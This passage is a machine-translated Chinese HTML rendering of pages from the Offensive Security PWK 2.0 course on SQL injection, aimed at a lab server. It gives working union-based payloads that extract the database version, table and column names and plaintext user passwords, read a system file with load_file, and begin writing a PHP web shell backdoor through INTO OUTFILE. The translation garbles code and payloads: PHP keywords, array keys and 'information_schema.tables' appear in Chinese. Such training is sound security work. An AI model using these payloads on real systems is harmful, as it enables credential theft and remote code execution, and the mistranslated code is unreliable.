<div style="position:absolute;top:16147;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果其中任何一个不清楚，现在是直接连接到数据库的好时机</font></font></i></nobr></div>
<div style="position:absolute;top:16167;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次使用这些查询。</font><font style="vertical-align: inherit;">你不需要是一个有经验的人</font></font></i></nobr></div>
<div style="position:absolute;top:16186;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库管理员利用SQL注入，但你越熟悉</font></font></i></nobr></div>
<div style="position:absolute;top:16205;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL 以及这些查询正在做什么，从 SQL 错误中走出来会更容易</font></font></i></nobr></div>
<div style="position:absolute;top:16225;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功利用 SQL 注入漏洞的消息。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:16287;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.8 从数据库中提取数据</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以开始从数据库中提取信息。</font><font style="vertical-align: inherit;">下面的例子使用</font></font></nobr></div>
<div style="position:absolute;top:16341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于 MariaDB 的命令。</font><font style="vertical-align: inherit;">然而，大多数其他数据库提供类似的功能</font></font></nobr></div>
<div style="position:absolute;top:16360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语法略有不同。</font><font style="vertical-align: inherit;">不管我们的目标是什么数据库软件，最好理解</font></font></nobr></div>
<div style="position:absolute;top:16380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于平台的命令。</font></font></nobr></div>
<div style="position:absolute;top:16412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，要输出 MariaDB 的版本，我们可以使用以下 URL：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:16447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1 </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">union all select 1, 2, </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@@version</font></font></font></b></nobr></div>
<div style="position:absolute;top:16467;left:264"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 327 - 用于提取数据库版本的 SQL 注入负载 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:16807;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="15"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 15 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:16840;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:17917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:17917;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:17917;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">335</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:16930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.8.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这应该在名称字段中输出“2”，在注释字段中输出数据库版本号：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17171;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 169：提取 MariaDB 版本号</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font><font style="vertical-align: inherit;">看起来那是有效的。</font><font style="vertical-align: inherit;">接下来，让我们用这个查询输出当前的数据库用户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1 </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">union all select 1, 2, </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user()</font></font></font></b></nobr></div>
<div style="position:absolute;top:17256;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 328 - 用于提取数据库用户的 SQL 注入负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此查询显示 root 用户正在用于数据库查询：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17504;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 170：提取当前数据库用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">information_schema</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举数据库表和列结构</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">288</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font></nobr></div>
<div style="position:absolute;top:17555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息模式存储有关数据库的信息，如表名和列名。</font><font style="vertical-align: inherit;">我们可以</font></font></nobr></div>
<div style="position:absolute;top:17574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用它来获取数据库的布局，以便我们可以制作更好的有效载荷来提取敏感的</font></font></nobr></div>
<div style="position:absolute;top:17593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据。</font><font style="vertical-align: inherit;">对此的查询类似于以下内容：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1 </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">union all select 1, 2, </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">table_name from information_sc</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:17645;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">血表</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17664;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 329 - 用于提取表名的 SQL 注入负载</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:17867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">288 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Information_schema</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:17995;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="16"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 16 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:18028;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:19105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:19105;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:19105;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">336</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:18118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.8.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这应该会输出很多数据，其中大部分引用了有关默认对象的信息</font></font></nobr></div>
<div style="position:absolute;top:18158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">玛丽亚数据库。</font><font style="vertical-align: inherit;">它还将包括表名，但我们需要滚动输出才能找到</font></font></nobr></div>
<div style="position:absolute;top:18177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18698;left:301"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 171：从数据库中提取表名</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表看起来特别有趣。</font><font style="vertical-align: inherit;">让我们以该表为目标并检索列名</font></font></nobr></div>
<div style="position:absolute;top:18748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用以下查询：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1 </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">union all select 1, 2, </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">column_name from information_s</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:18800;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chema.columns where table_name='users'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18819;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 330 - 用于提取表列的 SQL 注入负载 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:19183;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="17"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 17 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:19216;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:20293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:20293;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:20293;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">337</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:19306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.8.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将输出</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">users</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表的</font><font style="vertical-align: inherit;">所有列名</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19719;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 172：从数据库中提取列名</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了这些信息，我们就可以从表中提取用户名和密码。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:19770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知道原始查询选择三列，网页显示第二列和</font></font></nobr></div>
<div style="position:absolute;top:19789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">三。</font><font style="vertical-align: inherit;">如果我们更新我们的联合有效载荷，我们可以在第二列中显示用户名和</font></font></nobr></div>
<div style="position:absolute;top:19809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第三列中的密码。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1 </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">union all select 1, </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">username, password from users</font></font></font></b></nobr></div>
<div style="position:absolute;top:19863;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 331 - 用于提取用户表的 SQL 注入负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将在名称字段中输出数据库用户名，在注释字段中输出密码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:20181;left:304"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 173：提取用户表的内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的。</font><font style="vertical-align: inherit;">我们不仅得到了用户名和密码，而且密码都是明文的。</font></font></nobr></div>
<div style="position:absolute;top:20232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过登录管理页面来验证这些。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:20371;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="18"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 18 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:20404;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:21481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:21481;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:21481;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">338</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以查看源代码来验证我们通过黑盒测试得出的结论：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:20534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">36 &lt;?php</font></font></nobr></div>
<div style="position:absolute;top:20552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">37 包含“database.php”；</font></font></nobr></div>
<div style="position:absolute;top:20569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38 if (isset($_GET['id'])) {</font></font></nobr></div>
<div style="position:absolute;top:20586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39      </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sql = "SELECT id, name, text FROM feedback WHERE id=". </font><font style="vertical-align: inherit;">$_GET['id'];</font></font></font></b></nobr></div>
<div style="position:absolute;top:20602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40 $result = $conn-&gt;query($sql);</font></font></nobr></div>
<div style="position:absolute;top:20619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41 如果（！$结果）{</font></font></nobr></div>
<div style="position:absolute;top:20636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42    </font></font></nobr></div>
<div style="position:absolute;top:20636;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">trigger_error('发生错误：' . $conn-&gt;error);</font></font></nobr></div>
<div style="position:absolute;top:20653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43 } else if ($result-&gt;num_rows &gt; 0) {</font></font></nobr></div>
<div style="position:absolute;top:20671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">44    </font></font></nobr></div>
<div style="position:absolute;top:20671;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">while($row = $result-&gt;fetch_assoc()) {</font></font></nobr></div>
<div style="position:absolute;top:20687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">45    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:20687;left:206"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声 "&lt;tr&gt;&lt;td&gt; " 。</font><font style="vertical-align: inherit;">$row["名称"]。</font><font style="vertical-align: inherit;">"&lt;/td&gt;&lt;td&gt;" 。</font><font style="vertical-align: inherit;">$row["文本"]。</font><font style="vertical-align: inherit;">"&lt;/td&gt;&lt;/tr&gt;";</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:20704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46    </font></font></nobr></div>
<div style="position:absolute;top:20704;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:20721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47 } else { echo "没有结果。指定一个 id。"; </font><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:20738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48 } 其他 {</font></font></nobr></div>
<div style="position:absolute;top:20755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">49 echo "没有结果。在你的 URL 中指定一个 id，比如 ?id=1。";</font></font></nobr></div>
<div style="position:absolute;top:20772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">50 }</font></font></nobr></div>
<div style="position:absolute;top:20789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">51 ?&gt;</font></font></nobr></div>
<div style="position:absolute;top:20808;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 332 - 来自 debug.php 的代码摘录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致 SQL 注入的易受攻击代码位于清单 332 的第 39 行。注入点</font></font></nobr></div>
<div style="position:absolute;top:20857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位于查询末尾的“WHERE”子句中，便于使用“UNION”负载。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:20877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询的结果被提取出来，然后写出来显示在第 45 行。注意，虽然三个</font></font></nobr></div>
<div style="position:absolute;top:20896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列包含在查询中，只显示其中的两个。</font><font style="vertical-align: inherit;">这就是我们使用列的原因</font></font></nobr></div>
<div style="position:absolute;top:20915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">二和三用于从另一个表中提取数据。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:20950;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.9 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.使用SQL注入枚举数据库的结构。</font></font></nobr></div>
<div style="position:absolute;top:21008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 了解如何以及为什么可以从注入的命令中提取数据并拥有它</font></font></nobr></div>
<div style="position:absolute;top:21028;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示在屏幕上。</font></font></nobr></div>
<div style="position:absolute;top:21056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 从数据库中提取所有用户和相关密码。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:21090;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.10 从 SQL 注入到代码执行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看看我们可以将这个漏洞推到什么程度。</font><font style="vertical-align: inherit;">根据操作系统，服务</font></font></nobr></div>
<div style="position:absolute;top:21144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限、文件系统权限、SQL注入漏洞可用于读写</font></font></nobr></div>
<div style="position:absolute;top:21163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">底层操作系统上的文件。</font><font style="vertical-align: inherit;">将精心制作的包含 PHP 代码的文件写入</font></font></nobr></div>
<div style="position:absolute;top:21183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后可以利用 Web 服务器的根目录执行完整的代码。</font></font></nobr></div>
<div style="position:absolute;top:21215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们看看我们是否可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">load_file</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">读取文件</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:21250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1 </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">union all select 1, 2, </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">load_file('C:/Windows/System32</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:21267;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/drivers/etc/hosts')</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:21287;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 333 - 使用 load_file 函数的 SQL 注入负载 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:21559;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="19"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 19 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:21592;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:22669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:22669;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:22669;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">339</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:21682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.10.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这应该输出主机文件的内容：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22021;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 174：使用加载文件功能</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将尝试使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INTO OUTFILE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数在服务器的 web 中创建恶意 PHP 文件</font></font></nobr></div>
<div style="position:absolute;top:22071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根。</font><font style="vertical-align: inherit;">根据我们已经看到的错误消息，我们应该知道 Web 根目录的位置。</font></font></nobr></div>
<div style="position:absolute;top:22090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将尝试编写一个简单的 PHP 单行代码，类似于 LFI 示例中使用的代码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1 </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">union all select 1, 2, </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"&lt;?php echo shell_exec($_GET['</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:22142;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd']);?&gt;" 进入 OUTFILE 'c:/xampp/htdocs/backdoor.php'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
